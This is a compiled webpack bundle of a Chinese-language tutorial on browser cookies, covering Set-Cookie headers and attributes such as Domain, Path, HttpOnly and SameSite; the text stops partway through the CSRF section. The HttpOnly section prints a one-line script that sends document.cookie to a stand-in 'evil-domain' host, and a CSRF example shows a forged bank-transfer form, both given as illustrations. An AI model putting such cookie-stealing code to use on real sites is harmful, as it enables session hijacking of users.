(window.webpackJsonp=window.webpackJsonp||[]).push([[91],{377:function(t,e,a){"use strict";a.r(e);var s=a(13),o=Object(s.a)({},(function(){var t=this,e=t._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie"}},[t._v("#")]),t._v(" Cookie")]),t._v(" "),e("h2",{attrs:{id:"概述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#概述"}},[t._v("#")]),t._v(" 概述")]),t._v(" "),e("p",[t._v("Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。")]),t._v(" "),e("p",[t._v("HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如"),e("code",[t._v("id=1234")]),t._v("），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。")]),t._v(" "),e("p",[t._v("Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。")]),t._v(" "),e("ul",[e("li",[t._v("对话（session）管理：保存登录状态、购物车等需要记录的信息。")]),t._v(" "),e("li",[t._v("个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。")]),t._v(" "),e("li",[t._v("追踪用户：记录和分析用户行为。")])]),t._v(" "),e("p",[t._v("Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。")]),t._v(" "),e("p",[t._v("每个 Cookie 都有以下几方面的元数据。")]),t._v(" "),e("ul",[e("li",[t._v("Cookie 的名字")]),t._v(" "),e("li",[t._v("Cookie 的值（真正的数据写在这里面）")]),t._v(" "),e("li",[t._v("到期时间（超过这个时间会失效）")]),t._v(" "),e("li",[t._v("所属域名（默认为当前域名）")]),t._v(" "),e("li",[t._v("生效的路径（默认为当前网址）")])]),t._v(" "),e("p",[t._v("举例来说，用户访问网址"),e("code",[t._v("www.example.com")]),t._v("，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为"),e("code",[t._v("www.example.com")]),t._v("，生效路径为根路径"),e("code",[t._v("/")]),t._v("。")]),t._v(" "),e("p",[t._v("如果 Cookie 的生效路径设为"),e("code",[t._v("/forums")]),t._v("，那么这个 Cookie 只有在访问"),e("code",[t._v("www.example.com/forums")]),t._v("及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。")]),t._v(" "),e("p",[t._v("用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。"),e("code",[t._v("window.navigator.cookieEnabled")]),t._v("属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("window"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("navigator"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookieEnabled "),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// true")]),t._v("\n")])])]),e("p",[e("code",[t._v("document.cookie")]),t._v("属性返回当前网页的 Cookie。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// "id=foo;key=bar"')]),t._v("\n")])])]),e("p",[t._v("不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。")]),t._v(" "),e("p",[t._v("Cookie 是按照域名区分的，"),e("code",[t._v("foo.com")]),t._v("只能读取自己放置的 Cookie，无法读取其他网站（比如"),e("code",[t._v("bar.com")]),t._v("）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如"),e("code",[t._v("mydomain.com")]),t._v("不能读取"),e("code",[t._v("subdomain.mydomain.com")]),t._v("设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将"),e("code",[t._v("domain")]),t._v("属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("name=value; domain=mydomain.com")])]),t._v("\n")])])]),e("p",[t._v("上面示例中，设置 Cookie 时，"),e("code",[t._v("domain")]),t._v("属性设为"),e("code",[t._v("mydomain.com")]),t._v("，那么各级的子域名和一级域名都可以读取这个 Cookie。")]),t._v(" "),e("p",[t._v("注意，区分 Cookie 时不考虑协议和端口。也就是说，"),e("code",[t._v("http://example.com")]),t._v("设置的 Cookie，可以被"),e("code",[t._v("https://example.com")]),t._v("或"),e("code",[t._v("http://example.com:8080")]),t._v("读取。")]),t._v(" "),e("h2",{attrs:{id:"cookie-与-http-协议"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie-与-http-协议"}},[t._v("#")]),t._v(" Cookie 与 HTTP 协议")]),t._v(" "),e("p",[t._v("Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。")]),t._v(" "),e("h3",{attrs:{id:"http-回应-cookie-的生成"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#http-回应-cookie-的生成"}},[t._v("#")]),t._v(" HTTP 回应：Cookie 的生成")]),t._v(" "),e("p",[t._v("服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个"),e("code",[t._v("Set-Cookie")]),t._v("字段。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("foo=bar")])]),t._v("\n")])])]),e("p",[t._v("上面代码会在浏览器保存一个名为"),e("code",[t._v("foo")]),t._v("的 Cookie，它的值为"),e("code",[t._v("bar")]),t._v("。")]),t._v(" "),e("p",[t._v("HTTP 回应可以包含多个"),e("code",[t._v("Set-Cookie")]),t._v("字段，即在浏览器生成多个 Cookie。下面是一个例子。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token response-status"}},[e("span",{pre:!0,attrs:{class:"token http-version property"}},[t._v("HTTP/1.0")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token status-code number"}},[t._v("200")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token reason-phrase string"}},[t._v("OK")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Content-type")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("text/html")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("yummy_cookie=choco")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("tasty_cookie=strawberry")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token text-html"}},[t._v("\n[page content]\n")])])])]),e("p",[t._v("除了 Cookie 的值，"),e("code",[t._v("Set-Cookie")]),t._v("字段还可以附加 Cookie 的属性。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Expires=<date>")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Domain=<domain-value>")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Path=<path-value>")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Secure")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; HttpOnly")])]),t._v("\n")])])]),e("p",[t._v("上面的几个属性的含义，将在后文解释。")]),t._v(" "),e("p",[t._v("一个"),e("code",[t._v("Set-Cookie")]),t._v("字段里面，可以同时包括多个属性，没有次序的要求。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("<cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly")])]),t._v("\n")])])]),e("p",[t._v("下面是一个例子。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly")])]),t._v("\n")])])]),e("p",[t._v("如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的"),e("code",[t._v("key")]),t._v("、"),e("code",[t._v("domain")]),t._v("、"),e("code",[t._v("path")]),t._v("和"),e("code",[t._v("secure")]),t._v("都匹配。举例来说，如果原始的 Cookie 是用如下的"),e("code",[t._v("Set-Cookie")]),t._v("设置的。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("key1=value1; domain=example.com; path=/blog")])]),t._v("\n")])])]),e("p",[t._v("改变上面这个 Cookie 的值，就必须使用同样的"),e("code",[t._v("Set-Cookie")]),t._v("。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("key1=value2; domain=example.com; path=/blog")])]),t._v("\n")])])]),e("p",[t._v("只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("key1=value2; domain=example.com; path=/")])]),t._v("\n")])])]),e("p",[t._v("上面的命令设置了一个全新的同名 Cookie，但是"),e("code",[t._v("path")]),t._v("属性不一样。下一次访问"),e("code",[t._v("example.com/blog")]),t._v("的时候，浏览器将向服务器发送两个同名的 Cookie。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("key1=value1; key1=value2")])]),t._v("\n")])])]),e("p",[t._v("上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。")]),t._v(" "),e("h3",{attrs:{id:"http-请求-cookie-的发送"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#http-请求-cookie-的发送"}},[t._v("#")]),t._v(" HTTP 请求：Cookie 的发送")]),t._v(" "),e("p",[t._v("浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的"),e("code",[t._v("Cookie")]),t._v("字段。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("foo=bar")])]),t._v("\n")])])]),e("p",[t._v("上面代码会向服务器发送名为"),e("code",[t._v("foo")]),t._v("的 Cookie，值为"),e("code",[t._v("bar")]),t._v("。")]),t._v(" "),e("p",[e("code",[t._v("Cookie")]),t._v("字段可以包含多个 Cookie，使用分号（"),e("code",[t._v(";")]),t._v("）分隔。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("name=value; name2=value2; name3=value3")])]),t._v("\n")])])]),e("p",[t._v("下面是一个例子。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token method property"}},[t._v("GET")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token request-target url"}},[t._v("/sample_page.html")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token http-version property"}},[t._v("HTTP/1.1")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Host")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("www.example.org")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("yummy_cookie=choco; tasty_cookie=strawberry")])]),t._v("\n")])])]),e("p",[t._v("服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。")]),t._v(" "),e("ul",[e("li",[t._v("Cookie 的各种属性，比如何时过期。")]),t._v(" "),e("li",[t._v("哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。")])]),t._v(" "),e("h2",{attrs:{id:"cookie-的属性"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie-的属性"}},[t._v("#")]),t._v(" Cookie 的属性")]),t._v(" "),e("h3",{attrs:{id:"expires-max-age"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#expires-max-age"}},[t._v("#")]),t._v(" Expires，Max-Age")]),t._v(" "),e("p",[e("code",[t._v("Expires")]),t._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用"),e("code",[t._v("Date.prototype.toUTCString()")]),t._v("进行格式转换。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;")])]),t._v("\n")])])]),e("p",[t._v("如果不设置该属性，或者设为"),e("code",[t._v("null")]),t._v("，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。")]),t._v(" "),e("p",[e("code",[t._v("Max-Age")]),t._v("属性指定从现在开始 Cookie 存在的秒数，比如"),e("code",[t._v("60 * 60 * 24 * 365")]),t._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。")]),t._v(" "),e("p",[t._v("如果同时指定了"),e("code",[t._v("Expires")]),t._v("和"),e("code",[t._v("Max-Age")]),t._v("，那么"),e("code",[t._v("Max-Age")]),t._v("的值将优先生效。")]),t._v(" "),e("p",[t._v("如果"),e("code",[t._v("Set-Cookie")]),t._v("字段没有指定"),e("code",[t._v("Expires")]),t._v("或"),e("code",[t._v("Max-Age")]),t._v("属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。")]),t._v(" "),e("h3",{attrs:{id:"domain-path"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#domain-path"}},[t._v("#")]),t._v(" Domain，Path")]),t._v(" "),e("p",[e("code",[t._v("Domain")]),t._v("属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。")]),t._v(" "),e("p",[t._v("服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。")]),t._v(" "),e("p",[t._v("如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。")]),t._v(" "),e("p",[t._v("举例来说，当前域名为"),e("code",[t._v("x.y.z.com")]),t._v("，那么 Domain 属性可以设为"),e("code",[t._v("x.y.z.com")]),t._v("，或者"),e("code",[t._v("y.z.com")]),t._v("，或者"),e("code",[t._v("z.com")]),t._v("，但不能设为"),e("code",[t._v("foo.x.y.z.com")]),t._v("，或者"),e("code",[t._v("another.domain.com")]),t._v("。")]),t._v(" "),e("p",[t._v("另一个例子是，当前域名为"),e("code",[t._v("wangdoc.github.io")]),t._v("，则 Domain 属性只能设为"),e("code",[t._v("wangdoc.github.io")]),t._v("，不能设为"),e("code",[t._v("github.io")]),t._v("，因为后者是一个公共域名。")]),t._v(" "),e("p",[t._v("浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是"),e("code",[t._v("y.z.com")]),t._v("，那么适用于"),e("code",[t._v("y.z.com")]),t._v("、"),e("code",[t._v("x.y.z.com")]),t._v("、"),e("code",[t._v("foo.x.y.z.com")]),t._v("等域名。再比如，Domain 属性是公共域名"),e("code",[t._v("github.io")]),t._v("，那么只适用于"),e("code",[t._v("github.io")]),t._v("这个域名本身，不适用于它的子域名"),e("code",[t._v("wangdoc.github.io")]),t._v("。")]),t._v(" "),e("p",[e("code",[t._v("Path")]),t._v("属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，"),e("code",[t._v("Path")]),t._v("属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，"),e("code",[t._v("Path")]),t._v("属性是"),e("code",[t._v("/")]),t._v("，那么请求"),e("code",[t._v("/docs")]),t._v("路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。")]),t._v(" "),e("h3",{attrs:{id:"secure-httponly"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#secure-httponly"}},[t._v("#")]),t._v(" Secure，HttpOnly")]),t._v(" "),e("p",[e("code",[t._v("Secure")]),t._v("属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的"),e("code",[t._v("Secure")]),t._v("属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。")]),t._v(" "),e("p",[e("code",[t._v("HttpOnly")]),t._v("属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是"),e("code",[t._v("document.cookie")]),t._v("属性、"),e("code",[t._v("XMLHttpRequest")]),t._v("对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Image")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),e("p",[t._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),e("code",[t._v("HttpOnly")]),t._v("属性，上面代码就不会读到该 Cookie。")]),t._v(" "),e("h3",{attrs:{id:"samesite"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#samesite"}},[t._v("#")]),t._v(" SameSite")]),t._v(" "),e("p",[t._v("Chrome 51 开始，浏览器的 Cookie 新增加了一个"),e("code",[t._v("SameSite")]),t._v("属性，用来防止 CSRF 攻击和用户追踪。")]),t._v(" "),e("p",[t._v("Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站"),e("code",[t._v("your-bank.com")]),t._v("，银行服务器发来了一个 Cookie。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("id=a3fWa;")])]),t._v("\n")])])]),e("p",[t._v("用户后来又访问了恶意网站"),e("code",[t._v("malicious.com")]),t._v("，上面有一个表单。")]),t._v(" "),e("div",{staticClass:"language-html extra-class"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("your-bank.com/transfer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("POST"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  ...\n"),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),e("p",[t._v("用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。")]),t._v(" "),e("div",{staticClass:"language-html extra-class"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("your-bank.com/transfer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("POST"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token 